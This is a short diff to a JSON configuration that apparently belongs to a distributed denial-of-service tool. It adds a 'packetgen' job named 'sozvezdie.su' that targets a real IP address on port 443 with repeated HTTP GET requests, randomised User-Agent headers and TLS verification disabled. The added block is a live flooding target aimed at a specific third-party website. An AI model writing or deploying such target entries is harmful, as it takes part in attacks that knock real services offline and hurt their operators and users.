@@ -2839,6 +2839,36 @@
       "count": 8
     },
     {
+      "type": "packetgen",
+      "name": "sozvezdie.su",
+      "args": {
+        "dynamic": false,
+        "connection": {
+          "type": "net",
+          "args": {
+            "protocol": "tcp",
+            "address": "95.167.120.115:443",
+            "tls_config": {
+              "insecure_skip_verify": true
+            }
+          }
+        },
+        "packet": {
+          "payload": {
+            "type": "http",
+            "data": {
+              "method": "GET",
+              "path": "https://sozvezdie.su",
+              "headers": {
+                "User-Agent": "{{ random_user_agent }}"
+              }
+            }
+          }
+        }
+      },
+      "count": 8
+    },
+    {
       "type": "encrypted",
       "args": {
         "format": "json",
